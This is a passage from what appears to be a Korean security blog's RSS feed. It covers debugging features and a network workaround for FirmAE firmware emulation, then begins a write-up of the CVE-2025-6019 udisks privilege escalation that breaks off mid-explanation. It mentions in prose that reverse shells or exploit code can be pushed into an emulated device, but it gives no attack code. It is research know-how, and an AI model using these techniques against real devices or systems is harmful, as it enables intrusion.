&#xAE30;&#xB2A5;&#xC785;&#xB2C8;&#xB2E4;. 1&#xBC88; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xB354;&#xB77C;&#xB3C4;, netcat &#xC5F0;&#xACB0;&#xC774; &#xC798; &#xB418;&#xC5C8;&#xB2E4;&#xBA74; &#xC0DD;&#xC131;&#xB41C; &#xC8FC;&#xC18C;&#xC640; &#xD3EC;&#xD2B8;&#xB85C; &#xAC00;&#xC0C1; &#xAE30;&#xAE30; &#xC6F9; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xC811;&#xC18D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;! &#x1F310;</p></li><li><p>connect to shell: shell&#xB85C; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xB41C; &#xAC00;&#xC0C1; &#xAE30;&#xAE30;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xC5EC; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC785;&#xB2C8;&#xB2E4;!<br>busybox &#xB4F1;&#xC73C;&#xB85C; &#xD574;&#xB2F9; &#xD38C;&#xC6E8;&#xC5B4;&#xC5D0; &#xC815;&#xC758;&#xB41C; linux &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xAE30;&#xAE30; &#xB0B4;&#xC5D0;&#xC11C; &#xBD84;&#xC11D;&#xACFC; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F9EA;</p></li></ul><p><img src="image004.png" alt="image004.png"></p><ul><li>tcpdump: &#xC0DD;&#xC131;&#xD55C; &#xAC00;&#xC0C1; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; tcpdump&#xB85C; &#xBD84;&#xC11D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x2709;&#xFE0F; &#xAE30;&#xC785;&#xB41C; &#xBA85;&#xB839;&#xC5B4;&#xB294; &#xB530;&#xB85C; &#xC218;&#xC815;&#xC774; &#xC548;&#xB418;&#xB2C8; &#xC0DD;&#xC131;&#xB41C; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C;&#xB9CC; &#xBD84;&#xC11D;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><p><img src="image005.png" alt="image005.png"></p><ul><li><p>run gdbserver: &#xAC00;&#xC0C1; &#xAE30;&#xAE30; &#xB0B4;&#xBD80;&#xC5D0; gdb server &#xC5F4;&#xC5B4; &#xB3D9;&#xC801; &#xBD84;&#xC11D;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC785;&#xB2C8;&#xB2E4;.</p><p>  &#xC774; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xC900;&#xBE44;&#xAC00; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xAE30;&#xAE30; &#xD38C;&#xC6E8;&#xC5B4;&#xB294; ARM, MIPS &#xB4F1;&#xC758; RISC &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB300;&#xBD80;&#xBD84;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC77C;&#xBC18; gdb&#xB85C;&#xB294; &#xC1A1;&#xC218;&#xC2E0;&#xB418;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC778;&#xC2DD;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. &#x26A0;&#xFE0F; &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; gdb-multiarch&#xB97C; &#xD1B5;&#xD574;&#xC11C; gdb server&#xC5D0; &#xC811;&#xC18D;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p>  <pre><code class="hljs bash">sudo apt-get install gdb-multiarchgdb-multiarch<span class="hljs-built_in">set</span> sysroot<span class="hljs-built_in">set</span> follow-fork-mode child<span class="hljs-built_in">set</span> solib-search-path PATHtarget remote IP:PORT</code></pre><p>  &#xC124;&#xCE58; &#xD6C4;&#xC5D0;&#xB294; &#xC704;&#xCC98;&#xB7FC; gdb-multiarch &#xC2E4;&#xD589; &#xD6C4; &#xBA87; &#xAC00;&#xC9C0; &#xC124;&#xC815;&#xC744; &#xC9C4;&#xD589;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC804;&#xC5D0; binwalk&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xC81C;&#xD55C; &#xD38C;&#xC6E8;&#xC5B4; lib &#xC8FC;&#xC18C;&#xB97C; path&#xB85C; &#xB4F1;&#xB85D;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#x1F4D6;</p><p>  &#xC608;&#xC81C; &#xD38C;&#xC6E8;&#xC5B4; &#xD504;&#xB85C;&#xC138;&#xC2A4; pid&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xC124;&#xC815; &#xB41C; gdb server&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xBA74; &#xC811;&#xC18D;&#xC774; &#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. httpd &#xAC19;&#xC740; &#xC6F9; &#xC11C;&#xBE44;&#xC2A4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC801;&#xC6A9;&#xD558;&#xBA74; &#xD574;&#xB2F9; &#xC6F9; &#xD398;&#xC774;&#xC9C0; &#xAE30;&#xB2A5;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xB514;&#xBC84;&#xAE45;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ul><p><img src="image006.png" alt="image006.png"></p><ul><li><p>file transfer: &#xB85C;&#xCEEC;&#xC5D0; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xC744; &#xAC00;&#xC0C1; &#xAE30;&#xAE30;&#xB85C; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>  &#xC804;&#xC1A1;&#xB41C; &#xD30C;&#xC77C;&#xC774; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xACBD;&#xB85C;&#xB294; &#xD38C;&#xC6E8;&#xC5B4; &#xB0B4;&#xC5D0; &#xC0DD;&#xC131;&#xB41C; <code>firmadyne/</code> &#xB0B4;&#xC5D0; &#xC704;&#xCE58;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xC774;&#xC720;&#xB294; <code>FirmAE/debug.py</code>&#xC5D0;&#xC11C; <code>file_transfer()</code>&#xC5D0; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC00;&#xC0C1; &#xAE30;&#xAE30;&#xC5D0; &#xD30C;&#xC77C;&#xC744; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xB9AC;&#xBC84;&#xC2A4; &#xC258; &#xAC19;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xBC00;&#xC5B4; &#xB123;&#xAC70;&#xB098;, <code>xinetd.conf</code>, <code>sshd_config</code> &#xAC19;&#xC740; &#xC124;&#xC815; &#xD30C;&#xC77C;&#xC744; &#xC804;&#xC1A1;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x2708;&#xFE0F; &#xD544;&#xC694;&#xC5D0; &#xB530;&#xB77C;&#xC11C;&#xB294; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xC640; &#xAD00;&#xB828; &#xD30C;&#xC77C;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xC5EC; &#xD14C;&#xC2A4;&#xD2B8; &#xD560; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>  <img src="image007.png" alt="image007.png"></p></li></ul><h2 id="3-IP-&#xBC0F;-&#xB124;&#xD2B8;&#xC6CC;&#xD06C;-&#xBB38;&#xC81C;-&#xBC1C;&#xC0DD;-&#xC2DC;-&#xD574;&#xACB0;-&#xBC29;&#xBC95;"><a href="#3-IP-&#xBC0F;-&#xB124;&#xD2B8;&#xC6CC;&#xD06C;-&#xBB38;&#xC81C;-&#xBC1C;&#xC0DD;-&#xC2DC;-&#xD574;&#xACB0;-&#xBC29;&#xBC95;" class="headerlink" title="3. IP &#xBC0F; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xBB38;&#xC81C; &#xBC1C;&#xC0DD; &#xC2DC; &#xD574;&#xACB0; &#xBC29;&#xBC95;"></a>3. IP &#xBC0F; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xBB38;&#xC81C; &#xBC1C;&#xC0DD; &#xC2DC; &#xD574;&#xACB0; &#xBC29;&#xBC95;</h2><p>FirmAE&#xB294; &#xAE30;&#xAE30; &#xD38C;&#xC6E8;&#xC5B4;&#xC5D0; &#xC124;&#xC815;&#xB41C; IP &#xC8FC;&#xC18C;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB97C; &#xC124;&#xC815;&#xD558;&#xACE0; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xAD6C;&#xB3D9;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xAE30;&#xAE30; &#xD38C;&#xC6E8;&#xC5B4;&#xC5D0; &#xB530;&#xB77C;&#xC11C; IP&#xAC00; &#xC124;&#xC815;&#xC774; &#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xAC70;&#xB098;, localhost&#xB85C;&#xB9CC; &#xC811;&#xC18D;&#xD558;&#xB294; &#xB4F1;&#xC758; &#xC5EC;&#xB7EC; &#xAC00;&#xC9C0; &#xC774;&#xC720;&#xB85C; FirmAE &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC774; &#xB3D9;&#xC791;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xC885;&#xC885; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F62D;</p><p><img src="image008.jpg" alt="image008.jpg"></p><p>&#xC774; &#xBB38;&#xC81C;&#xB294; &#xC5EC;&#xB7EC;&#xAC00;&#xC9C0; &#xC6D0;&#xC778;&#xACFC; &#xD574;&#xACB0; &#xBC29;&#xBC95;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xC911; <code>scripts/makeNetwork.py</code> &#xB97C; &#xC218;&#xC815;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xD574;&#xACB0;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD574; &#xC18C;&#xAC1C;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>FirmAE&#xC5D0;&#xC11C;&#xB294; &#xAE30;&#xBCF8; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC124;&#xC815;(&#xBE0C;&#xB9AC;&#xC9C0; &#xBAA8;&#xB4DC;)&#xC5D0; &#xC2E4;&#xD328;&#xD588;&#xC744; &#xB54C;, &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xACC4;&#xC18D; &#xC9C4;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB300;&#xCCB4; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xBC29;&#xC2DD;(QEMU &#xC0AC;&#xC6A9;&#xC790; &#xBAA8;&#xB4DC;)&#xC73C;&#xB85C; &#xC790;&#xB3D9; &#xC804;&#xD658;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F6B8; &#xC790;&#xB3D9; &#xC804;&#xD658;&#xC774; &#xB418;&#xBA74;, <strong>localhost&#xB85C; &#xC811;&#xC18D; &#xD658;&#xACBD;&#xC774; &#xAD6C;&#xC131;</strong>&#xC774; &#xB429;&#xB2C8;&#xB2E4;. &#xC544;&#xB798; &#xC0AC;&#xC9C4;&#xC758; &#xD38C;&#xC6E8;&#xC5B4;&#xB3C4; &#xAC19;&#xC740; &#xACBD;&#xC6B0;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, localhost&#xB85C; &#xC811;&#xC18D; &#xD658;&#xACBD;&#xC774; &#xAD6C;&#xC131;&#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image009.png" alt="image009.png"></p><p>&#xC774;&#xAC83;&#xC740; <code>scratch/{IID}/run.sh</code> &#xB0B4;&#xC5D0; <code>QEMU_NET_OPTS</code> &#xBCC0;&#xC218;&#xB97C; &#xD1B5;&#xD574; QEMU &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xB294; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xBE0C;&#xB9AC;&#xC9C0; &#xC124;&#xC815;&#xC744; &#xC870;&#xC815;&#xD558;&#xB294; &#xACF3;&#xC5D0;&#xC11C; &#xBC8C;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>&#xC55E;&#xC11C; FirmAE &#xAD6C;&#xC131;&#xC5D0; &#xB300;&#xD574; &#xC124;&#xBA85;&#xD560; &#xB54C;, <code>scratch/{IID}</code> &#xD3F4;&#xB354;&#xC640; &#xD30C;&#xC77C;&#xB4E4;&#xC740; <code>scripts/makeNetwork.py</code>&#xC5D0;&#xC11C; &#xC0DD;&#xC131;&#xD558;&#xACE0;, &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC124;&#xC815;&#xC744; &#xD55C;&#xB2E4;&#xACE0; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774; &#xD30C;&#xC774;&#xC36C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC218;&#xC815;&#xD558;&#xBA74; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xC2DC;, &#xBB34;&#xC870;&#xAC74; localhost&#xB85C; &#xC5F4;&#xC5B4;&#xBC84;&#xB9B4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F513;</p><ul><li><p><code>scripts/makeNetwork.py</code> &#xC218;&#xC815;</p>  <pre><code class="hljs bash">cp scripts/makeNetwork.py scripts/makeNetwork.py.bak</code></pre><p>  &#xBA3C;&#xC800; &#xC6D0;&#xBCF8; &#xD30C;&#xC77C;&#xC744; &#xBC31;&#xC5C5;&#xD574;&#xB461;&#xB2C8;&#xB2E4;.</p>  <pre><code class="hljs python">isUserNetwork = any(isDhcpIp(ip) <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> ips)<span class="hljs-keyword">with</span> open(SCRATCHDIR + <span class="hljs-string">&quot;/&quot;</span> + str(iid) + <span class="hljs-string">&quot;/isDhcp&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> out:</code></pre>  <pre><code class="hljs python"><span class="hljs-comment"># isUserNetwork = any(isDhcpIp(ip) for ip in ips)</span>isUserNetwork = <span class="hljs-literal">True</span><span class="hljs-keyword">with</span> open(SCRATCHDIR + <span class="hljs-string">&quot;/&quot;</span> + str(iid) + <span class="hljs-string">&quot;/isDhcp&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> out:</code></pre><p>  IP &#xC124;&#xC815; &#xBD80;&#xBD84;&#xC744; &#xCCAB; &#xBC88;&#xC9F8; &#xCF54;&#xB4DC;&#xB97C; &#xB450; &#xBC88;&#xC9F8;&#xCC98;&#xB7FC; &#xC218;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p>  <pre><code class="hljs python">portfwd = <span class="hljs-string">&quot;hostfwd=tcp::80-:80,hostfwd=tcp::443-:443,&quot;</span><span class="hljs-keyword">for</span> (proto, ip, port) <span class="hljs-keyword">in</span> ports:</code></pre>  <pre><code class="hljs python">portfwd = <span class="hljs-string">&quot;hostfwd=tcp::8888-:80,&quot;</span><span class="hljs-comment"># portfwd = &quot;hostfwd=tcp::80-:80,hostfwd=tcp::443-:443,&quot;</span><span class="hljs-keyword">for</span> (proto, ip, port) <span class="hljs-keyword">in</span> ports:</code></pre><p>  port &#xC124;&#xC815; &#xBD80;&#xBD84;&#xB3C4; &#xCCAB; &#xBC88;&#xC9F8; &#xCF54;&#xB4DC;&#xB97C; &#xB450; &#xBC88;&#xC9F8;&#xCC98;&#xB7FC; &#xC218;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p></li></ul><p><img src="image010.png" alt="image010.png"></p><p>&#xD30C;&#xC77C; &#xC218;&#xC815; &#xD6C4; &#xC2E4;&#xD589;&#xC744; &#xD558;&#xBA74; IP&#xAC00; localhost&#xB85C; &#xBCC0;&#xACBD;&#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;! &#x1F44D;&#x1F3FB;</p><p>&#xC774; &#xBC29;&#xBC95;&#xC740; &#xB2E8;&#xC21C;&#xD788; &#xC124;&#xC815;&#xB418;&#xB294; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xB9CC;&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xB294; &#xAC83;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xADFC;&#xBCF8;&#xC801;&#xC778; &#xD574;&#xACB0; &#xBC29;&#xBC95;&#xC774; &#xC544;&#xB2D0; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACC4;&#xC18D; &#xB3D9;&#xC791;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xC9C1;&#xC811; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xC5EC; &#xC815;&#xD655;&#xD788; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC124;&#xC815;&#xC744; &#xB9DE;&#xCDB0; &#xC8FC;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC55E;&#xC11C; &#xC124;&#xBA85; &#xB4DC;&#xB9B0; &#xAC83;&#xCC98;&#xB7FC; <code>scratch/{IID}/</code>&#xC5D0; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305; &#xC9C4;&#xD589; &#xC911;&#xC5D0; &#xBC1C;&#xC0DD;&#xD55C; &#xBAA8;&#xB4E0; &#xB85C;&#xADF8;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xAE30;&#xC5D0;, &#xB85C;&#xADF8;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xBA74;&#xC11C;&#xB3C4; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xB294; &#xAC83;&#xB3C4; &#xC88B;&#xC740; &#xBC29;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</p><p>QEMU&#xB97C; &#xD1B5;&#xD574; &#xC9C1;&#xC811; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xD558;&#xB294; &#xAC83;&#xB3C4; &#xCD94;&#xCC9C; &#xB4DC;&#xB9BD;&#xB2C8;&#xB2E4;! &#xC0AC;&#xC6A9;&#xD574;&#xBCF4;&#xC2E0; &#xBD84;&#xB4E4;&#xC740; &#xC54C;&#xACA0;&#xC9C0;&#xB9CC; FirmAE&#xB294; &#xC815;&#xB9D0; &#xB290;&#xB9AC;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xC8E0;&#x2026;</p><p><img src="image011.png" alt="image011.png"></p><p>FirmAE&#xB294; &#xB290;&#xB9AC;&#xAE34; &#xD558;&#xC9C0;&#xB9CC;, &#xC798;&#xB9CC; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xBD84;&#xBA85;&#xD788; &#xC720;&#xC6A9;&#xD55C; &#xB3C4;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;! &#xC774; &#xAE00;&#xB85C; &#xC5EC;&#xB7EC;&#xBD84;&#xC758; &#xD38C;&#xC6E8;&#xC5B4; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xC5D0; &#xC870;&#xAE08;&#xC774;&#xB098;&#xB9C8; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC5C8;&#xC73C;&#xBA74; &#xC88B;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#x1F64F;&#x1F3FB;</p><p>&#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xB2E4;&#xB978; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC8FC;&#xC81C;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;! &#x1F44B;&#x1F3FB;</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/firmware/">firmware</category>
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/Embedded/">Embedded</category>
      
      <category domain="https://hackyboiz.github.io/tags/Emulation/">Emulation</category>
      
      
      <comments>https://hackyboiz.github.io/2025/07/10/newp1ayer48/emulation2/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-6019 : Fedora 및 SUSE Linux에서 udisks, libblockdev와 관련된 Local Privilege Escalation</title>
      <link>https://hackyboiz.github.io/2025/07/09/romi0x/1day1line0709/</link>
      <guid>https://hackyboiz.github.io/2025/07/09/romi0x/1day1line0709/</guid>
      <pubDate>Wed, 09 Jul 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.securelayer7.net/cve-2025-6019-local-p</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://blog.securelayer7.net/cve-2025-6019-local-privilege-escalation/">https://blog.securelayer7.net/cve-2025-6019-local-privilege-escalation/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>&#xB300;&#xBD80;&#xBD84;&#xC758; Linux &#xBC30;&#xD3EC;&#xD310;&#xC5D0; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xD3EC;&#xD568;&#xB41C; udisks &#xB370;&#xBAAC;</li><li>Fedora, SUSE, &#xBC0F; udisks2&#xC640; libblockdev&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294;  &#xC2DC;&#xC2A4;&#xD15C;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-6019&#xB294; Linux &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xB514;&#xC2A4;&#xD06C; &#xAD00;&#xB9AC; &#xB370;&#xBAAC;&#xC778; udisks&#xC640; &#xADF8; &#xD558;&#xC704; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC778; libblockdev &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;(Local Privilege Escalation, LPE) &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; &#xC77C;&#xBC18; &#xC0AC;&#xC6A9;&#xC790;&#xB3C4; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xBB38;&#xC81C;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC11C; &#xB098;&#xC624;&#xB294; libblockdev&#xB294; &#xB9AC;&#xB205;&#xC2A4; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xBE14;&#xB85D; &#xC7A5;&#xCE58;(&#xB514;&#xC2A4;&#xD06C; &#xB4F1;)&#xB97C; &#xB2E4;&#xB8E8;&#xAE30; &#xC704;&#xD55C; C &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB85C;, &#xD30C;&#xD2F0;&#xC158; &#xC0DD;&#xC131;, &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xD3EC;&#xB9F7;, &#xB9C8;&#xC6B4;&#xD2B8; &#xB4F1;&#xC758; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC77C;&#xBC18; &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xC9C1;&#xC811; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC5C6;&#xACE0;, &#xC8FC;&#xB85C; udisks &#xAC19;&#xC740; &#xACE0;&#xC218;&#xC900; &#xB370;&#xBAAC;&#xC744; &#xD1B5;&#xD574; &#xAC04;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xCC98;&#xB7FC; libblockdev&#xB294; &#xC2A4;&#xD1A0;&#xB9AC;&#xC9C0; &#xC791;&#xC5C5;&#xC744; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xBCF4;&#xC548;&#xC0C1; &#xB9E4;&#xC6B0; &#xC911;&#xC694;&#xD55C; &#xAD6C;&#xC131;&#xC694;&#xC18C;&#xC785;&#xB2C8;&#xB2E4;.</p><h3 id="CVE-Flow"><a href="#CVE-Flow" class="headerlink" title="CVE Flow"></a>CVE Flow</h3><p>udisksd&#xB294; D-Bus&#xB97C; &#xD1B5;&#xD574; &#xB514;&#xC2A4;&#xD06C; &#xB9C8;&#xC6B4;&#xD2B8;, &#xD3EC;&#xB9F7; &#xB4F1;&#xC758; &#xC791;&#xC5C5;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xBA70;, &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; polkit&#xC744; &#xD1B5;&#xD574; &#xAD8C;&#xD55C;&#xC744; &#xAC80;&#xC99D;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xBB38;&#xC81C; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; &#xC0AC;&#xC6A9;&#xC790; UID&#xB97C; &#xC81C;&#xB300;&#xB85C; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xACE0;, &#xB2E8;&#xC21C;&#xD788; allow_active &#xC0C1;&#xD0DC;&#xC778;&#xC9C0; &#xC5EC;&#xBD80;&#xB9CC; &#xAC80;&#xC0AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB85C; &#xC778;&#xD574; allow_active &#xAD8C;&#xD55C;&#xB9CC; &#xAC00;&#xC9C4; &#xBE44;&#xB8E8;&#xD2B8; &#xC0AC;&#xC6A9;&#xC790;&#xB3C4; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C;&#xC774; &#xD544;&#xC694;&#xD55C; &#xC791;&#xC5C5;&#xC744; udisksd&#xB97C; &#xD1B5;&#xD574; 